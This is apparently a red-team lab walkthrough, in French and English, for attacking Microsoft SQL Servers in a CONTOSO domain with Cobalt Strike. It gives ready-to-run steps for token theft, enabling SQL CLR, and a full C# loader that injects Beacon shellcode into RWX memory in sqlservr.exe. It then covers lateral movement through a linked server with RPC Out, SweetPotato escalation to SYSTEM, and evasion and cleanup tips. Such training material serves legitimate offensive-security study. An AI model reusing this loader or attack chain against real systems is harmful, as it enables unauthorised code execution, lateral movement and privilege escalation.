# Lab — Microsoft SQL Servers

> **Objectif :** étudier l’exécution de code, le Lateral Movement et la Privilege Escalation sur les serveurs Microsoft SQL de l’environnement CONTOSO.

> **Parcours du lab :** énumérer les serveurs SQL dans AD → identifier les groupes `sysadmin` → étudier l’impersonation Kerberos → activer SQL CLR → charger une assembly .NET → rejoindre un second serveur via Linked Server → examiner `SeImpersonatePrivilege`.

---

## Énumération

> ⚠️ **Contexte des Beacons utilisés dans ce lab :**
> - `[BEACON: wkstn-1 | USER: pchilds]` — Beacon initial de moyenne intégrité
> - `[BEACON: wkstn-1 | USER: rsteel]` — même Beacon après l’utilisation du token du processus `rsteel`
> - `[BEACON: lon-db-1 | USER: mssql_svc]` — Beacon CLR dans le processus `sqlservr.exe` de `lon-db-1`
> - `[BEACON: lon-db-2 | USER: mssql_svc]` — Beacon CLR dans le processus `sqlservr.exe` de `lon-db-2`
> - `[BEACON: lon-db-2 | USER: SYSTEM]` — Beacon tcp-local après Privilege Escalation dans le lab

**But de cette phase :** identifier les instances SQL, leurs méthodes d’authentification et les permissions du compte courant avant toute opération.

1. Lancer Cobalt Strike et se connecter au team server.

2. Charger le script Aggressor SQL-BOF.❗ 
    - Ouvrir **Cobalt Strike > Script Manager**
    - Cliquer sur **Load**
    - Sélectionner `C:\Tools\SQL-BOF\SQL\SQL.cna` 

    > **Pourquoi :** SQL-BOF ajoute les commandes `sql-*` sous forme de Beacon Object Files. Ces commandes s’exécutent dans le contexte du Beacon, mais leur classification OPSEC dépend également de la requête SQL effectuée.

3. **BEACON: User** — 🔍 Rechercher les serveurs MS SQL disposant d’une configuration Kerberos.

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

4. **BEACON: User** — 🔍 Consulter les informations de `lon-db-1` et les privilèges du compte courant :

```
sql-info lon-db-1
sql-whoami lon-db-1
```

    > **Utilité :** `sql-info` présente l’instance, son mode d’authentification et les Linked Servers ; `sql-whoami` indique l’identité et le rôle SQL du compte.  
    > `OPSEC-🟢SAFE` dans les notes — exécution via SQL-BOF sans processus enfant.

    > **Résultat attendu :** `pchilds` dispose ici des rôles `public/guest`, sans droits `sysadmin`. Les opérations nécessitant des privilèges élevés ne sont donc pas disponibles.

5. **BEACON: User** — Rechercher les groupes associés au rôle `sysadmin` sur SQL Server.

```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```

> **Résultat du lab :** le groupe `CN=Database Admins` contient `CN=Robert Steel` (`rsteel`).


6. **BEACON: SYSTEM** — Examiner le contexte d’impersonation de `rsteel` pour accéder au rôle `sysadmin` de `lon-db-1`.

    > **Explication :** dans ce lab, `rsteel` dispose du rôle `sysadmin` sur `lon-db-1`. L’identité Windows utilisée pour la connexion SQL détermine les permissions accordées.

    **Vérifier d’abord les tickets Kerberos et les processus appartenant à `rsteel` :**

    ```
    krb_triage
    process_browser
    ```

    > `krb_triage` recense les tickets Kerberos accessibles ; rechercher le TGT de `rsteel` associé au service `krbtgt`.  
    > `process_browser` affiche les processus et leurs propriétaires ; rechercher ceux qui appartiennent à `rsteel`.  
    > `OPSEC-🟢SAFE` dans les notes — opérations BOF sans lancement de processus enfant.

    **Examiner l’utilisation du token d’un processus appartenant à `rsteel` :**

```
steal_token <pid of rsteel cmd process>
```

    > Remplacer `<pid>` par le PID du processus `rsteel` identifié avec `process_browser`.  
    > `steal_token` permet au Beacon d’utiliser le token Windows d’un autre processus, ce qui peut modifier l’identité employée pour certaines connexions réseau.  
    > `OPSEC-🟢SAFE` dans les notes — manipulation du token sans création de processus enfant.


7. **BEACON: SYSTEM - rsteel** — Vérifier le rôle `sysadmin` sur `lon-db-1`.

```
sql-whoami lon-db-1
```
>Le lab poursuit avec la configuration CLR et les assemblies SQL, sous réserve des droits obtenus.  


<img src="/images/sql-server-impersonate-user-rsteel-sysadmin.png">  

## Exécution de code avec SQL CLR

**Objectif :** comprendre le fonctionnement de SQL CLR, qui permet d’exécuter une assembly .NET dans le contexte du processus SQL Server. Son activité demeure observable et dépend de la configuration du serveur.

1. **BEACON: SYSTEM - rsteel** — Vérifier l’état de SQL CLR.

```
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```

    > **Explication :** vérifier l’état de CLR permet de déterminer si une modification de configuration est nécessaire, et de la documenter.  
    > `OPSEC-🟠CAUTION` — les requêtes sur `sys.configurations` peuvent être consignées si l’audit SQL est actif.  
    > **Résultat attendu :** `0` signifie désactivé.

2. **BEACON: SYSTEM - rsteel** — Activer SQL CLR sur `lon-db-1`.

```
sql-enableclr lon-db-1
```

    > **Explication :** ce réglage active l’intégration CLR sur l’instance SQL Server, lorsque les autorisations nécessaires sont réunies.  
    > `OPSEC-🟠CAUTION` — la modification de configuration peut être enregistrée dans les journaux SQL Server.

3. Générer le payload SMB x64 prévu par le lab.

    1. **Payloads > Windows Stageless Payload**
    2. Listener : **smb**
    3. Format de sortie : **Raw**
    4. Fonction de sortie : **Thread**
    5. x64: ✓
    6. Cliquer sur **Generate**
    7. Enregistrer dans `C:\Payloads\smb_x64.xthread.bin`


<img src="/images/sql-server-stageless-payload-smb-raw-thread-bin.png">  

    > **Listener SMB :** le lab utilise les named pipes SMB pour communiquer avec un Beacon lorsque la machine ne dispose pas d’accès direct au team server.  
    > **Format Raw :** le fichier binaire est intégré comme ressource dans l’assembly CLR.  
    > **Fonction de sortie :** l’option `Thread` termine le thread associé ; `Process` pourrait arrêter le processus SQL Server lui-même.

4. Dans Visual Studio, créer un projet `Class Library (.NET Framework)` :
    1. Nom du projet : `MyProcedure`
    2. Enregistrer dans le même dossier : ✓
    3. Framework: .NET Framework 4.7.2

    > **.NET Framework** SQL Server's CLR runtime only supports .NET Framework assemblies❗   

5. Ajouter `smb_x64.xthread.bin` comme ressource intégrée.

    > Dans Solution Explorer : clic droit sur le projet → Add → Existing Item → choisir le fichier `.bin`  
    > Sélectionner le fichier → Properties → **Build Action: Embedded Resource**  
    > **Ressource intégrée :** le contenu du fichier binaire est stocké dans la DLL et accessible lors de son chargement.

6. Insérer le code du lab dans `Class1.cs` :

```c#
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var assembly = Assembly.GetExecutingAssembly();

        byte[] shellcode;

        // read embedded payload — name must match: <AssemblyName>.<filename>
        using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
        {
            using (var ms = new MemoryStream())
            {
                rs.CopyTo(ms);
                shellcode = ms.ToArray();
            }
        }

        // allocate RWX memory inside sqlservr.exe
        var hMemory = VirtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
            PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

        // copy shellcode into allocated memory
        WriteProcessMemory(
            new IntPtr(-1),
            hMemory,
            shellcode,
            (uint)shellcode.Length,
            out _);

        // execute shellcode in a new thread
        var hThread = CreateThread(
            IntPtr.Zero,
            0,
            hMemory,
            IntPtr.Zero,
            THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
            out _);

        // close the thread handle — thread continues running (beacon stays alive)
        CloseHandle(hThread);
    }

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        VIRTUAL_ALLOCATION_TYPE flAllocationType,
        PAGE_PROTECTION_FLAGS flProtect);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out uint lpNumberOfBytesWritten);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        THREAD_CREATION_FLAGS dwCreationFlags,
        out uint lpThreadId);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool CloseHandle(IntPtr hObject);

    [Flags]
    public enum VIRTUAL_ALLOCATION_TYPE : uint
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
        MEM_RESET = 0x00080000,
        MEM_RESET_UNDO = 0x01000000,
        MEM_REPLACE_PLACEHOLDER = 0x00004000,
        MEM_LARGE_PAGES = 0x20000000,
        MEM_RESERVE_PLACEHOLDER = 0x00040000,
        MEM_FREE = 0x00010000,
    }

    [Flags]
    public enum PAGE_PROTECTION_FLAGS : uint
    {
        PAGE_NOACCESS = 0x00000001,
        PAGE_READONLY = 0x00000002,
        PAGE_READWRITE = 0x00000004,
        PAGE_WRITECOPY = 0x00000008,
        PAGE_EXECUTE = 0x00000010,
        PAGE_EXECUTE_READ = 0x00000020,
        PAGE_EXECUTE_READWRITE = 0x00000040,
        PAGE_EXECUTE_WRITECOPY = 0x00000080,
        PAGE_GUARD = 0x00000100,
        PAGE_NOCACHE = 0x00000200,
        PAGE_WRITECOMBINE = 0x00000400,
    }

    [Flags]
    public enum THREAD_CREATION_FLAGS : uint
    {
        THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
        THREAD_CREATE_SUSPENDED = 0x00000004,
        STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
    }
}
```

    > **Fonctionnement :** lorsque SQL Server invoque `MyProcedure` comme procédure stockée :
    > 1. Lit les données `.bin` depuis les ressources de la DLL.
    > 2. Alloue une zone mémoire RWX dans `sqlservr.exe`.
    > 3. Copie les octets du payload dans cette zone.
    > 4. Démarre un thread qui exécute le payload SMB.
    > 5. Ferme le handle du thread ; son exécution peut se poursuivre indépendamment.
    >
    > Le Beacon fonctionne dans le processus `sqlservr.exe`, sans créer de processus enfant.  
    > `OPSEC-🟠CAUTION` — l’allocation `PAGE_EXECUTE_READWRITE` peut être surveillée par les EDR. La classification OPSEC du lab ne garantit pas l’absence de détection.  
    >
    > **Important :** le nom fourni à `GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin")` doit correspondre exactement au format `<NomProjet>.<NomFichier>`. Une erreur renvoie `null` et empêche la procédure de fonctionner.

    Compiler le projet : **Build → Build Solution** (Release mode)  
    Format de sortie : `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`


<img src="/images/sql-server-MyProcedure-visual-studio-code-build-release.png">  

7. **BEACON SYSTEM - rsteel** — Load the CLR assembly on *lon-db-1* and execute the stored procedure.

```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```

    > ** SQL-BOF does here:** Reads the DLL from your attacker machine, uploads it to the SQL server, enables `TRUSTWORTHY` on the database (required for unsafe assemblies), registers the DLL as a CLR assembly, creates a stored procedure named `MyProcedure` that calls the .NET method, then executes it.  
    > `OPSEC-🟠CAUTION` — `TRUSTWORTHY` database setting change is logged. The CLR assembly registration is visible in `sys.assemblies`. The stored procedure execution is logged if SQL auditing is active.  
    > The beacon will now be running inside `sqlservr.exe` on lon-db-1 as the SQL service account.

8. **BEACON SYSTEM - rsteel** — Link to the Beacon on lon-db-1.

    > **linking is needed:** The SMB beacon is not a reverse HTTP/HTTPS beacon — it does not call out to your team server. Instead, it creates an SMB named pipe and waits. Connect *to it* from a beacon that has SMB access to lon-db-1. Linking creates the communication tunnel: `CS Team Server → your beacon → SMB pipe → SQL beacon`.

    > **requires a CIFS ticket:** SMB named pipe authentication requires a valid `cifs/<hostname>` Kerberos service ticket. If your beacon session doesn't have one, the link will fail with `ERROR_LOGON_FAILURE`.

    **Option 1 — Run `link` from the pchilds' Beacon (simplest path):**

    From the original medium-integrity pchilds beacon:

```
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

    > `OPSEC-🟢SAFE` — Windows automatically uses pchilds' cached TGT to request a `cifs/lon-db-1` ticket from the KDC before authenticating the SMB connection. No manual ticket work needed.  
    > The TSVCPIPE name is defined in your CS SMB listener. You can press TAB to autocomplete it.  
    > Run this from **pchilds' beacon**, not from any impersonated session — you need a valid TGT in the session to auto-request CIFS.



9. **BEACON SYSTEM - rsteel** — Disable SQL CLR on *lon-db-1* after the beacon is linked.

```
sql-disableclr lon-db-1
```

    > **Why:** Clean up. Reverting CLR to disabled reduces your footprint and removes the attack surface from future detection reviews.  
    > `OPSEC-🟢SAFE` — configuration rollback.

<img src="/images/sql-server-load-DLL-link-beacon-cleanup.png">  

# Lateral Movement

**phase:** lon-db-1 has a SQL linked server relationship with lon-db-2. The link uses passthrough Windows auth — the SQL identity used on lon-db-2 depends on WHO connects to lon-db-1's SQL. You must connect as a user that has sysadmin on BOTH servers (rsteel/Database Admins). The `mssql_svc` service account has sysadmin on lon-db-1 but only guest/public on lon-db-2 — running these commands from the lon-db-1 CLR beacon will fail.

---

1. **BEACON - SYSTEM rsteel** — Confirm rsteel is still impersonated, then enumerate SQL links on *lon-db-1*.

```cs
getuid    // must show CONTOSO\rsteel — re-run steal_token <rsteel-pid> if not
sql-links lon-db-1
```

2. **BEACON - SYSTEM rsteel** — Verify rsteel has sysadmin on *lon-db-2* via the link.

```cs
sql-whoami lon-db-1 "" lon-db-2
```

    > ⚠️  Expected output (as rsteel): `sysadmin role` on lon-db-2.

3. **BEACON wkstn-1 SYSTEM rsteel** — Check RPC Out status on the link.

```cs
sql-checkrpc lon-db-1
```

    > Expected: `LON-DB-2 | is_rpc_out_enabled: 0` — must enable before CLR relay works.

4. **BEACON wkstn-1 SYSTEM rsteel** — Enable RPC Out on the link to *lon-db-2*.

```cs
sql-enablerpc lon-db-1 lon-db-2
```

> OPSEC-🟠CAUTION — link config change logged in SQL Server error log and `sys.servers`.

<img src="/images/sql-server-lateral-movement-enable-RPC-link.png">  


5. **BEACON 💻wkstn-1 ❗ SYSTEM  CONTOSO\rsteel💡** — Execute the SQL CLR payload on `lon-db-2` via `lon-db-1`.

```cs
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```

    > ⚠️   The SQL-BOF connects to lon-db-1 using the beacon's Windows identity. From the lon-db-1 mssql_svc beacon, the connection authenticates as mssql_svc (guest on lon-db-2) → `42000: The user does not have permission`. From the wkstn-1 rsteel beacon, the connection authenticates as rsteel (sysadmin on both) → success.


    > Wait ~10 seconds for beacon to spawn inside lon-db-2's sqlservr.exe before linking.
    > OPSEC-🟠CAUTION — TRUSTWORTHY setting change and assembly registration logged on lon-db-2.  
    

<img src="/images/sql-server-sql-clr-lon-db-1-MyProcedure-dll-lon-db-2.png">  


6. **BEACON 💻lon-db-1 ❗ mssql_svc** — Link to the beacon on *lon-db-2*.

    Switch to the **lon-db-1 CLR beacon**, then:

```cs
link lon-db-2 <smb-listener-pipe-name>
```

> ⚠️ run from **lon-db-1 beacon** — lon-db-2 is on a separate network segment not reachable from wkstn-1 via SMB. lon-db-1 has direct network adjacency to lon-db-2 (SQL link already proved TCP 1433 connectivity; mssql_svc has CIFS access to lon-db-2).  

> This builds the chain: `CS Team Server ↔ wkstn-1 beacon ↔ lon-db-1 SMB beacon ↔ lon-db-2 SMB beacon`.
`[+] established link to child beacon: 10.10.120.25`
> OPSEC-🟢SAFE — SMB named pipe connection, no new process spawned.  

7. **BEACON 💻 wkstn-1 ❗SYSTEM  CONSTOSO\rsteel - admin** — Disable RPC Out after beacon is linked.

```cs
sql-disablerpc lon-db-1 lon-db-2
```

    > Clean up — revert RPC Out to reduce configuration footprint.

---

> ⚠️ **Trap** If `sql-clr ... "" lon-db-2` is run from the **lon-db-1 mssql_svc beacon**, it fails with `42000: The user does not have permission to perform this action`. This leaves a dirty hash in `sys.trusted_assemblies` on lon-db-2. On the next clean attempt (from rsteel context), SQL-BOF detects and drops the leftover hash automatically — allow it to proceed.

---

# Privilege Escalation

**Why this phase:** The beacon running inside `sqlservr.exe` on lon-db-2 is running as the MSSQL service account (`NT Service\MSSQLSERVER`). This account has `SeImpersonatePrivilege` enabled by design — SQL Server requires it to impersonate client connections. SweetPotato exploits this privilege to get a SYSTEM token and run an arbitrary process as SYSTEM.

1. Interact with the **lon-db-2 CLR beacon** in CS.

2. **BEACON: lon-db-2 USER: mssql_svc** — Check the service account identity.

```    
getuid
whoami
```

    > Lab-confirmed: `CONTOSO\mssql_svc`. SweetPotato requires `SeImpersonatePrivilege` — present by design on all SQL service accounts.

    > **Expected output:** `NT Service\MSSQLSERVER` (or similar SQL service account).  
    > The BOF output will include `SeImpersonatePrivilege: Enabled`.  
    > **Why this matters:** `SeImpersonatePrivilege` is the Potato family prerequisite. Any local service account with this privilege can impersonate SYSTEM via DCOM/COM authentication coercion.

3. Generate a TCP (localhost-only) executable payload.

    1. **Payloads > Windows Stageless Payload**
    2. Listener : **tcp-local**
    3. Format de sortie : Windows Executable
    4. Fonction de sortie : Process
    5. x64: ✓
    6. Cliquer sur **Generate**
    7. Save to `C:\Payloads\tcp-local_x64.exe`

    > **Why tcp-local:** lon-db-2 is on a separate network segment with no outbound path to your team server. `tcp-local` binds only to `127.0.0.1` — the beacon is reached via the existing beacon chain (lon-db-1's beacon connects to it locally on lon-db-2), not directly from your attacker machine.  
    > **Why Process exit:** After SweetPotato runs the EXE and the beacon connects back, the EXE can exit. The beacon communicates through the chain, not via this process.

<img src="/images/sql-server-privilege-escalation-tcp-local-payload.png">  

4. **BEACON: lon-db-2 USER: mssql_svc** — Change working directory to MSSQL service profile (mssql_svc owns it, less monitored than Temp).

```
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
```

5. **BEACON: lon-db-2  USER: mssql_svc** — Upload the tcp-local payload.

```
upload C:\Payloads\tcp-local_x64.exe
```

> `OPSEC-🟠CAUTION` — file write to disk. Defender may flag the EXE. 🟠Custom artifact required in exam.

6. **BEACON: lon-db-2  USER: mssql_svc** — Execute the payload using SweetPotato to abuse SeImpersonatePrivilege `OPSEC-🟠CAUTION`.

```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```

    **PrintSpoofer** method (`-i` NP impersonation):
    > ```
    > [+] Triggering notification on evil PIPE \\lon-db-2/pipe/...
    > [+] Server connected to our evil RPC pipe
    > [+] Duplicated impersonation token ready for process creation
    > [+] Intercepted and authenticated successfully, launching program
    > [+] Process created, enjoy!
    > ```

    > **SweetPotato**
    > 1. Creates a fake COM server on the local machine
    > 2. Coerces a privileged Windows service (SYSTEM) to authenticate to the fake COM server via DCOM
    > 3. Captures the SYSTEM authentication token using `SeImpersonatePrivilege`
    > 4. Calls `CreateProcessWithTokenW` to run your EXE under the impersonated SYSTEM token
    >
    > Result: `tcp-local_x64.exe` runs as `NT AUTHORITY\SYSTEM`.  
    > `OPSEC-🟠CAUTION` — `execute-assembly` uses fork & run (spawns a sacrificial process). For the exam, ensure your malleable profile has `spawnto` set to a non-signatured binary (e.g. `dllhost.exe`).

7. **BEACON: lon-db-2 USER: mssql_svc** — Connect to the new SYSTEM beacon.

```
connect localhost 1337
```

    > Lab-confirmed: `[+] established link to child beacon: 10.10.120.25` → `NT AUTHORITY\SYSTEM` on lon-db-2.

    > **localhost:** The tcp-local beacon bound to `127.0.0.1:1337` on lon-db-2. Since you are already running a beacon on lon-db-2 (the MSSQL one), `connect localhost 1337` reaches the SYSTEM beacon from within the same host.  
    > `OPSEC-🟢SAFE` — loopback TCP connection, no external traffic.  
    > Port `1337` is defined in your `tcp-local` listener configuration.

> **Lab complete.** LDAP-based SQL server enumeration, Kerberos ticket impersonation to gain sysadmin, SQL CLR payload execution for code execution inside the SQL process, lateral movement via SQL linked servers across network segments, and privilege escalation from SQL service account to SYSTEM via SeImpersonatePrivilege.

<img src="/images/sql-servers-linked-lab-final-view.png" width=860>
